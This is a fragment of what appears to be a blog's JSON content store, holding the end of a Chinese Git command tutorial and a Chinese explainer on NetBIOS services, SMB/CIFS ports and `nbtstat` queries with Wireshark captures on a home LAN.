#查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master</p>\n<p><strong><code>git branch &lt;分支名称&gt;</code></strong>         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）<br><strong><code>git branch -d &lt;分支名称&gt;</code></strong>     #删除指定分支</p>\n<p><strong><code>git checkout &lt;分支名称&gt;</code></strong>     #进入指定分支</p>\n<p><strong><code>git merge &lt;分支名称&gt;</code></strong>          #将指定分支与当前所在分支进行合并。</p>\n</blockquote>\n<h2 id=\"0x03-连接Github\"><a href=\"#0x03-连接Github\" class=\"headerlink\" title=\"0x03 连接Github\"></a>0x03 连接Github</h2><blockquote>\n<p><strong><code>git remote add  &lt;github仓库地址别名&gt;    &lt;github仓库地址&gt;</code></strong>        </p>\n<blockquote>\n<p>别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。</p>\n</blockquote>\n<p><strong><code>git clone  &lt;github项目网址&gt;</code></strong>      #克隆下载项目</p>\n<p><strong><code>git pull &lt;github网址别名&gt;  &lt;分支名称&gt;</code></strong>    #从github拉取指定分支代码。</p>\n<blockquote>\n<p>上面条等价于下面两条：<br>​        <strong><code>git fetch   &lt;github网址别名&gt;    &lt;分支名称&gt;</code></strong><br>​        <strong><code>git merge   &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong></p>\n</blockquote>\n<p><strong><code>git push &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong>  #将当前所在分支推到github上。</p>\n</blockquote>\n<h2 id=\"0x04-将某些文件隔离出版本控制\"><a href=\"#0x04-将某些文件隔离出版本控制\" class=\"headerlink\" title=\"0x04 将某些文件隔离出版本控制\"></a>0x04 将某些文件隔离出版本控制</h2><ul>\n<li>在工作目录下创建<strong>.gitignore</strong>文件</li>\n<li>文件的编写格式内容</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*.sql    #表示所有后缀为.sql的文件都被隔离</span><br><span class=\"line\">*.pyc\t #表示所有后缀为.pyc的文件都被隔离</span><br><span class=\"line\">a.txt\t #表示隔离a.txt</span><br></pre></td></tr></table></figure>\n<h4 id=\"教程博客与参考链接\"><a href=\"#教程博客与参考链接\" class=\"headerlink\" title=\"教程博客与参考链接\"></a>教程博客与参考链接</h4><ul>\n<li><a href=\"https://www.cnblogs.com/wupeiqi/p/7295372.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/wupeiqi/p/7295372.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/10/git-internals.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2018/10/git-internals.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-workflow.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-Git概述\"><a href=\"#0x00-Git概述\" class=\"headerlink\" title=\"0x00 Git概述\"></a>0x00 Git概述</h2><p><em>Git</em>是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。</p>","more":"<h2 id=\"0x01-Git安装\"><a href=\"#0x01-Git安装\" class=\"headerlink\" title=\"0x01 Git安装\"></a>0x01 Git安装</h2><p>到官网下载安装程序安装即可：<a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/</a></p>\n<h2 id=\"0x02-基本操作\"><a href=\"#0x02-基本操作\" class=\"headerlink\" title=\"0x02 基本操作\"></a>0x02 基本操作</h2><blockquote>\n<p><strong><code>git   init</code>  </strong>     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git status</code></strong>       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）</p>\n<ul>\n<li>PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><strong><code>git add  &lt;filename&gt;</code></strong>    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）<br><strong><code>git add  .</code></strong>          #将当前目录下的所有文件加入版本控制。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git commit -m</code></strong> “详细描述信息”       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git log</code></strong>         #版本创建/变更日志。<br><strong><code>git reflog</code></strong>     #同上，但更详细。</p>\n<blockquote>\n<p>可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><strong><code>git reset --hard &lt;版本号&gt;</code> </strong>    #切换状态到指定的版本（快照）</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git branch</code>  </strong> #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master</p>\n<p><strong><code>git branch &lt;分支名称&gt;</code></strong>         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）<br><strong><code>git branch -d &lt;分支名称&gt;</code></strong>     #删除指定分支</p>\n<p><strong><code>git checkout &lt;分支名称&gt;</code></strong>     #进入指定分支</p>\n<p><strong><code>git merge &lt;分支名称&gt;</code></strong>          #将指定分支与当前所在分支进行合并。</p>\n</blockquote>\n<h2 id=\"0x03-连接Github\"><a href=\"#0x03-连接Github\" class=\"headerlink\" title=\"0x03 连接Github\"></a>0x03 连接Github</h2><blockquote>\n<p><strong><code>git remote add  &lt;github仓库地址别名&gt;    &lt;github仓库地址&gt;</code></strong>        </p>\n<blockquote>\n<p>别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。</p>\n</blockquote>\n<p><strong><code>git clone  &lt;github项目网址&gt;</code></strong>      #克隆下载项目</p>\n<p><strong><code>git pull &lt;github网址别名&gt;  &lt;分支名称&gt;</code></strong>    #从github拉取指定分支代码。</p>\n<blockquote>\n<p>上面条等价于下面两条：<br>​        <strong><code>git fetch   &lt;github网址别名&gt;    &lt;分支名称&gt;</code></strong><br>​        <strong><code>git merge   &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong></p>\n</blockquote>\n<p><strong><code>git push &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong>  #将当前所在分支推到github上。</p>\n</blockquote>\n<h2 id=\"0x04-将某些文件隔离出版本控制\"><a href=\"#0x04-将某些文件隔离出版本控制\" class=\"headerlink\" title=\"0x04 将某些文件隔离出版本控制\"></a>0x04 将某些文件隔离出版本控制</h2><ul>\n<li>在工作目录下创建<strong>.gitignore</strong>文件</li>\n<li>文件的编写格式内容</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*.sql    #表示所有后缀为.sql的文件都被隔离</span><br><span class=\"line\">*.pyc\t #表示所有后缀为.pyc的文件都被隔离</span><br><span class=\"line\">a.txt\t #表示隔离a.txt</span><br></pre></td></tr></table></figure>\n<h4 id=\"教程博客与参考链接\"><a href=\"#教程博客与参考链接\" class=\"headerlink\" title=\"教程博客与参考链接\"></a>教程博客与参考链接</h4><ul>\n<li><a href=\"https://www.cnblogs.com/wupeiqi/p/7295372.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/wupeiqi/p/7295372.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/10/git-internals.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2018/10/git-internals.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-workflow.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html</a></li>\n</ul>"},{"title":"NetBIOS、SMB浅析","date":"2019-03-23T03:54:48.000Z","_content":"\n## 前面的话\n\n一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。\n\n借此有时间想进行梳理并记录以便自己理解。\n\n<!-- more -->\n\n## 正文\n\n### NetBIOS\n\n> NetBIOS，为网络基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。  ——摘自Wikipedia\n\nNetBIOS提供了三种软件服务：\n\n> - 名称解析服务（NetBIOS Name Service）：UDP 137\n> - 数据报服务（NetBIOS Datagram Service）：UDP 138\n> - 会话服务（NetBIOS Session Service）：TCP 139\n\n![](NetBIOS、SMB浅析\\20181112194501454.jpg)\n\n**0x00 名称解析服务（NBNS）**\n\n运行在137（UDP）端口，提供计算机的名字到IP地址的查询服务，类似于TCP/IP协议中的DNS。\n\n计算机名称到IP地址的管理方式：\n\n- 第一种：位于同一工作组中的电脑之间利用广播功能进行计算机名管理。\n\n> ​\t电脑在启动或者连接网络时，会向同一工作组中的所有计算机质询有没有和自己相同的NetBIOS名称。\n\n- 另一种：利用WINS（Windows因特网名称服务）管理NetBIOS名称。\n\n> WINS服务器用于记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。WINS客户端在系统起动时或连接网络时会将自己的NetBIOS名称与IP地址发送给WINS服务器。\n\n向目标主机的137端口发送一个连接请求，就能获得目标主机的名称、MAC地址。\n\n#### NBTSTAT\n\nnbtstat是Windows下与NetBIOS相关的DOS命令。\n\n```\nNBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]\n\n  -a   (适配器状态)     列出指定名称的远程机器的名称表（可跟名称和IP）\n  -A   (适配器状态)     列出指定 IP 地址的远程机器的名称表。（只能IP）\n  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存\n  -n   (名称)          列出本地 NetBIOS 名称。\n  -r   (已解析)        列出通过广播和经由 WINS 解析的名称\n  -R   (重新加载)       清除和重新加载远程缓存名称表\n  -S   (会话)          列出具有目标 IP 地址的会话表\n  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。\n  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新\n\n  RemoteName   远程主机计算机名。\n  IP address   用点分隔的十进制表示的 IP 地址。\n  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。\n               按 Ctrl+C 停止重新显示统计。\n```\n\n环境介绍：\n\n我们的局域网中存在两台主机，分别是：\n\n> 主机名（NetBIOS名称）  <=========>       IP地址\n>\n> ​    SAKURA_II          <=========>    192.168.1.105 \n>\n> ​    XESTATION          <=========>    192.168.1.101\n\n以下演示的操作均在IP为192.168.1.105的主机上进行，并使用Wireshark抓包分析。\n\n- **`nbtstat -A 192.168.1.101`** ：查询IP为192.168.1.101主机的计算机的名称列表。\n\n> 实质是向192.168.1.101主机的NetBIOS的名称解析服务（NBNS)监听的UDP 137端口发送查询。\n\nWireshark抓取请求包：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323121259.png)\n\n命令执行的结果：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323122802.png)\n\n\n\n- **`nbtstat -c`**：查询NetBIOS缓存。\n- **`nbtstat -n`**：查询本地NetBIOS名称。\n\n**0x01 数据报服务（NBDS）**\n\n运行在138（UDP）端口，提供NetBIOS浏览功能，即显示连接到网络的计算机设备列表。\n\n> - 每台电脑在启动时或连接网络时通过138端口广播自己的NetBIOS名称，收到NetBIOS广播的计算机会将该计算机追加到浏览列表中；\n> - 关闭电脑时，计算机会通过138端口广播，收到NetBIOS广播的计算机会将该计算机从浏览列表中删除；\n> - 当计算机需要连接加入到网络的计算机设备列表，会广播一个请求，收到请求的主机会给其发送计算机列表。\n\n向目标主机的138端口发送请求，就能获得目标主机所处的局域网的网络名称以及目标主机的计算机名称，以及是否安装主控控制器，IIS是否正在运行等。\n\n周期性在UDP 138端口广播NetBIOS信息：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323125719.png)\n\n**0x02 会话服务（NBSS）**\n\n运行在139（TCP）端口，提供“NetBIOS Session Service”服务，使用SMB协议对外提供共享服务，包括Windows文件和打印机共享以及Unix中的Samba服务。\n\n***********\n\n### SMB协议\n\nSMB（Server Message Block）是由微软开发的应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。\n\n经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。\n\nSMB一开始的设计是在NetBIOS协议上运行的（而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上），从Windows 2000开始，微软引入SMB Direct Over TCP，重新命名为 CIFS（Common Internet File System），并打算将它与NetBIOS相脱离。\n\n#### CIFS\n\nCIFS是由微软在SMB的基础上，扩展到Internet上的协议。若SMB直接运行在TCP上（而不是NetBIOS上），即CIFS协议，使用TCP端口号445。提供的功能与139端口完全相同。\n\n为保证向后兼容性，Windows 2000以后版本中基于NBT的SMB和CIFS同时并存。\n\n> 当Windows系统（允许NBT）来连接SMB服务器时，同时尝试连接139和445端口：\n>\n> - 如果445端口有响应，那么发送RST包给139端口断开连接，使用455端口提供SMB服务。\n> - 当445端口无响应时，使用139端口提供SMB服务。\n\n#### Wireshark抓包\n\n在主机192.168.1.105上开启文件共享，不需要密码。\n\n在主机192.168.1.101上访问192.168.1.105主机上的共享：\\\\192.168.1.105\n\n![](NetBIOS、SMB浅析\\QQ截图20190323140801.png)\n\n**参考资料**\n\nhttps://www.cnblogs.com/bigrabbit/p/3910094.html","source":"_posts/NetBIOS、SMB浅析.md","raw":"---\ntitle: NetBIOS、SMB浅析\ndate: 2019-03-23 11:54:48\ntags:\n\t- SMB\n\t- NetBIOS\ncategories: Misc\n---\n\n## 前面的话\n\n一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。\n\n借此有时间想进行梳理并记录以便自己理解。\n\n<!-- more -->\n\n## 正文\n\n### NetBIOS\n\n> NetBIOS，为网络基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。  ——摘自Wikipedia\n\nNetBIOS提供了三种软件服务：\n\n> - 名称解析服务（NetBIOS Name Service）：UDP 137\n> - 数据报服务（NetBIOS Datagram Service）：UDP 138\n> - 会话服务（NetBIOS Session Service）：TCP 139\n\n![](NetBIOS、SMB浅析\\20181112194501454.jpg)\n\n**0x00 名称解析服务（NBNS）**\n\n运行在137（UDP）端口，提供计算机的名字到IP地址的查询服务，类似于TCP/IP协议中的DNS。\n\n计算机名称到IP地址的管理方式：\n\n- 第一种：位于同一工作组中的电脑之间利用广播功能进行计算机名管理。\n\n> ​\t电脑在启动或者连接网络时，会向同一工作组中的所有计算机质询有没有和自己相同的NetBIOS名称。\n\n- 另一种：利用WINS（Windows因特网名称服务）管理NetBIOS名称。\n\n> WINS服务器用于记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。WINS客户端在系统起动时或连接网络时会将自己的NetBIOS名称与IP地址发送给WINS服务器。\n\n向目标主机的137端口发送一个连接请求，就能获得目标主机的名称、MAC地址。\n\n#### NBTSTAT\n\nnbtstat是Windows下与NetBIOS相关的DOS命令。\n\n```\nNBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]\n\n  -a   (适配器状态)     列出指定名称的远程机器的名称表（可跟名称和IP）\n  -A   (适配器状态)     列出指定 IP 地址的远程机器的名称表。（只能IP）\n  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存\n  -n   (名称)          列出本地 NetBIOS 名称。\n  -r   (已解析)        列出通过广播和经由 WINS 解析的名称\n  -R   (重新加载)       清除和重新加载远程缓存名称表\n  -S   (会话)          列出具有目标 IP 地址的会话表\n  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。\n  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新\n\n  RemoteName   远程主机计算机名。\n  IP address   用点分隔的十进制表示的 IP 地址。\n  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。\n               按 Ctrl+C 停止重新显示统计。\n```\n\n环境介绍：\n\n我们的局域网中存在两台主机，分别是：\n\n> 主机名（NetBIOS名称）  <=========>       IP地址\n>\n> ​    SAKURA_II          <=========>    192.168.1.105 \n>\n> ​    XESTATION          <=========>    192.168.1.101\n\n以下演示的操作均在IP为192.168.1.105的主机上进行，并使用Wireshark抓包分析。\n\n- **`nbtstat -A 192.168.1.101`** ：查询IP为192.168.1.101主机的计算机的名称列表。\n\n> 实质是向192.168.1.101主机的NetBIOS的名称解析服务（NBNS)监听的UDP 137端口发送查询。\n\nWireshark抓取请求包：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323121259.png)\n\n命令执行的结果：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323122802.png)\n\n\n\n- **`nbtstat -c`**：查询NetBIOS缓存。\n- **`nbtstat -n`**：查询本地NetBIOS名称。\n\n**0x01 数据报服务（NBDS）**\n\n运行在138（UDP）端口，提供NetBIOS浏览功能，即显示连接到网络的计算机设备列表。\n\n> - 每台电脑在启动时或连接网络时通过138端口广播自己的NetBIOS名称，收到NetBIOS广播的计算机会将该计算机追加到浏览列表中；\n> - 关闭电脑时，计算机会通过138端口广播，收到NetBIOS广播的计算机会将该计算机从浏览列表中删除；\n> - 当计算机需要连接加入到网络的计算机设备列表，会广播一个请求，收到请求的主机会给其发送计算机列表。\n\n向目标主机的138端口发送请求，就能获得目标主机所处的局域网的网络名称以及目标主机的计算机名称，以及是否安装主控控制器，IIS是否正在运行等。\n\n周期性在UDP 138端口广播NetBIOS信息：\n\n![](NetBIOS、SMB浅析\\QQ截图20190323125719.png)\n\n**0x02 会话服务（NBSS）**\n\n运行在139（TCP）端口，提供“NetBIOS Session Service”服务，使用SMB协议对外提供共享服务，包括Windows文件和打印机共享以及Unix中的Samba服务。\n\n***********\n\n### SMB协议\n\nSMB（Server Message Block）是由微软开发的应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。\n\n经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。\n\nSMB一开始的设计是在NetBIOS协议上运行的（而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上），从Windows 2000开始，微软引入SMB Direct Over TCP，重新命名为 CIFS（Common Internet File System），并打算将它与NetBIOS相脱离。\n\n#### CIFS\n\nCIFS是由微软在SMB的基础上，扩展到Internet上的协议。若SMB直接运行在TCP上（而不是NetBIOS上），即CIFS协议，使用TCP端口号445。提供的功能与139端口完全相同。\n\n为保证向后兼容性，Windows 2000以后版本中基于NBT的SMB和CIFS同时并存。\n\n> 当Windows系统（允许NBT）来连接SMB服务器时，同时尝试连接139和445端口：\n>\n> - 如果445端口有响应，那么发送RST包给139端口断开连接，使用455端口提供SMB服务。\n> - 当445端口无响应时，使用139端口提供SMB服务。\n\n#### Wireshark抓包\n\n在主机192.168.1.105上开启文件共享，不需要密码。\n\n在主机192.168.1.101上访问192.168.1.105主机上的共享：\\\\192.168.1.105\n\n![](NetBIOS、SMB浅析\\QQ截图20190323140801.png)\n\n**参考资料**\n\nhttps://www.cnblogs.com/bigrabbit/p/3910094.html","slug":"NetBIOS、SMB浅析","published":1,"updated":"2019-03-25T12:18:26.167Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ks00247or0h6mznbno","content":"<h2 id=\"前面的话\"><a href=\"#前面的话\" class=\"headerlink\" title=\"前面的话\"></a>前面的话</h2><p>一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。</p>\n<p>借此有时间想进行梳理并记录以便自己理解。</p>\n<a id=\"more\"></a>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><h3 id=\"NetBIOS\"><a href=\"#NetBIOS\" class=\"headerlink\" title=\"NetBIOS\"></a>NetBIOS</h3><blockquote>\n<p>NetBIOS，为网络基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。  ——摘自Wikipedia</p>\n</blockquote>\n<p>NetBIOS提供了三种软件服务：</p>\n<blockquote>\n<ul>\n<li>名称解析服务（NetBIOS Name Service）：UDP 137</li>\n<li>数据报服务（NetBIOS Datagram Service）：UDP 138</li>\n<li>会话服务（NetBIOS Session Service）：TCP 139</li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/20181112194501454.jpg\" alt></p>\n<p><strong>0x00 名称解析服务（NBNS）</strong></p>\n<p>运行在137（UDP）端口，提供计算机的名字到IP地址的查询服务，类似于TCP/IP协议中的DNS。</p>\n<p>计算机名称到IP地址的管理方式：</p>\n<ul>\n<li>第一种：位于同一工作组中的电脑之间利用广播功能进行计算机名管理。</li>\n</ul>\n<blockquote>\n<p>​    电脑在启动或者连接网络时，会向同一工作组中的所有计算机质询有没有和自己相同的NetBIOS名称。</p>\n</blockquote>\n<ul>\n<li>另一种：利用WINS（Windows因特网名称服务）管理NetBIOS名称。</li>\n</ul>\n<blockquote>\n<p>WINS服务器用于记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。WINS客户端在系统起动时或连接网络时会将自己的NetBIOS名称与IP地址发送给WINS服务器。</p>\n</blockquote>\n<p>向目标主机的137端口发送一个连接请求，就能获得目标主机的名称、MAC地址。</p>\n<h4 id=\"NBTSTAT\"><a href=\"#NBTSTAT\" class=\"headerlink\" title=\"NBTSTAT\"></a>NBTSTAT</h4><p>nbtstat是Windows下与NetBIOS相关的DOS命令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]</span><br><span class=\"line\"></span><br><span class=\"line\">  -a   (适配器状态)     列出指定名称的远程机器的名称表（可跟名称和IP）</span><br><span class=\"line\">  -A   (适配器状态)     列出指定 IP 地址的远程机器的名称表。（只能IP）</span><br><span class=\"line\">  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存</span><br><span class=\"line\">  -n   (名称)          列出本地 NetBIOS 名称。</span><br><span class=\"line\">  -r   (已解析)        列出通过广播和经由 WINS 解析的名称</span><br><span class=\"line\">  -R   (重新加载)       清除和重新加载远程缓存名称表</span><br><span class=\"line\">  -S   (会话)          列出具有目标 IP 地址的会话表</span><br><span class=\"line\">  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。</span><br><span class=\"line\">  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新</span><br><span class=\"line\"></span><br><span class=\"line\">  RemoteName   远程主机计算机名。</span><br><span class=\"line\">  IP address   用点分隔的十进制表示的 IP 地址。</span><br><span class=\"line\">  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。</span><br><span class=\"line\">               按 Ctrl+C 停止重新显示统计。</span><br></pre></td></tr></table></figure>\n<p>环境介绍：</p>\n<p>我们的局域网中存在两台主机，分别是：</p>\n<blockquote>\n<p>主机名（NetBIOS名称）  &lt;=========&gt;       IP地址</p>\n<p>​    SAKURA_II          &lt;=========&gt;    192.168.1.105 </p>\n<p>​    XESTATION          &lt;=========&gt;    192.168.1.101</p>\n</blockquote>\n<p>以下演示的操作均在IP为192.168.1.105的主机上进行，并使用Wireshark抓包分析。</p>\n<ul>\n<li><strong><code>nbtstat -A 192.168.1.101</code></strong> ：查询IP为192.168.1.101主机的计算机的名称列表。</li>\n</ul>\n<blockquote>\n<p>实质是向192.168.1.101主机的NetBIOS的名称解析服务（NBNS)监听的UDP 137端口发送查询。</p>\n</blockquote>\n<p>Wireshark抓取请求包：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323121259.png\" alt></p>\n<p>命令执行的结果：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323122802.png\" alt></p>\n<ul>\n<li><strong><code>nbtstat -c</code></strong>：查询NetBIOS缓存。</li>\n<li><strong><code>nbtstat -n</code></strong>：查询本地NetBIOS名称。</li>\n</ul>\n<p><strong>0x01 数据报服务（NBDS）</strong></p>\n<p>运行在138（UDP）端口，提供NetBIOS浏览功能，即显示连接到网络的计算机设备列表。</p>\n<blockquote>\n<ul>\n<li>每台电脑在启动时或连接网络时通过138端口广播自己的NetBIOS名称，收到NetBIOS广播的计算机会将该计算机追加到浏览列表中；</li>\n<li>关闭电脑时，计算机会通过138端口广播，收到NetBIOS广播的计算机会将该计算机从浏览列表中删除；</li>\n<li>当计算机需要连接加入到网络的计算机设备列表，会广播一个请求，收到请求的主机会给其发送计算机列表。</li>\n</ul>\n</blockquote>\n<p>向目标主机的138端口发送请求，就能获得目标主机所处的局域网的网络名称以及目标主机的计算机名称，以及是否安装主控控制器，IIS是否正在运行等。</p>\n<p>周期性在UDP 138端口广播NetBIOS信息：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323125719.png\" alt></p>\n<p><strong>0x02 会话服务（NBSS）</strong></p>\n<p>运行在139（TCP）端口，提供“NetBIOS Session Service”服务，使用SMB协议对外提供共享服务，包括Windows文件和打印机共享以及Unix中的Samba服务。</p>\n<hr>\n<h3 id=\"SMB协议\"><a href=\"#SMB协议\" class=\"headerlink\" title=\"SMB协议\"></a>SMB协议</h3><p>SMB（Server Message Block）是由微软开发的应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。</p>\n<p>经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。</p>\n<p>SMB一开始的设计是在NetBIOS协议上运行的（而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上），从Windows 2000开始，微软引入SMB Direct Over TCP，重新命名为 CIFS（Common Internet File System），并打算将它与NetBIOS相脱离。</p>\n<h4 id=\"CIFS\"><a href=\"#CIFS\" class=\"headerlink\" title=\"CIFS\"></a>CIFS</h4><p>CIFS是由微软在SMB的基础上，扩展到Internet上的协议。若SMB直接运行在TCP上（而不是NetBIOS上），即CIFS协议，使用TCP端口号445。提供的功能与139端口完全相同。</p>\n<p>为保证向后兼容性，Windows 2000以后版本中基于NBT的SMB和CIFS同时并存。</p>\n<blockquote>\n<p>当Windows系统（允许NBT）来连接SMB服务器时，同时尝试连接139和445端口：</p>\n<ul>\n<li>如果445端口有响应，那么发送RST包给139端口断开连接，使用455端口提供SMB服务。</li>\n<li>当445端口无响应时，使用139端口提供SMB服务。</li>\n</ul>\n</blockquote>\n<h4 id=\"Wireshark抓包\"><a href=\"#Wireshark抓包\" class=\"headerlink\" title=\"Wireshark抓包\"></a>Wireshark抓包</h4><p>在主机192.168.1.105上开启文件共享，不需要密码。</p>\n<p>在主机192.168.1.101上访问192.168.1.105主机上的共享：\\192.168.1.105</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323140801.png\" alt></p>\n<p><strong>参考资料</strong></p>\n<p><a href=\"https://www.cnblogs.com/bigrabbit/p/3910094.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/bigrabbit/p/3910094.html</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"前面的话\"><a href=\"#前面的话\" class=\"headerlink\" title=\"前面的话\"></a>前面的话</h2><p>一直以来对NetBIOS和SMB很模糊，也分不清137、138、139、445端口的作用。</p>\n<p>借此有时间想进行梳理并记录以便自己理解。</p>","more":"<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><h3 id=\"NetBIOS\"><a href=\"#NetBIOS\" class=\"headerlink\" title=\"NetBIOS\"></a>NetBIOS</h3><blockquote>\n<p>NetBIOS，为网络基本输入输出系统（英语：Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。  ——摘自Wikipedia</p>\n</blockquote>\n<p>NetBIOS提供了三种软件服务：</p>\n<blockquote>\n<ul>\n<li>名称解析服务（NetBIOS Name Service）：UDP 137</li>\n<li>数据报服务（NetBIOS Datagram Service）：UDP 138</li>\n<li>会话服务（NetBIOS Session Service）：TCP 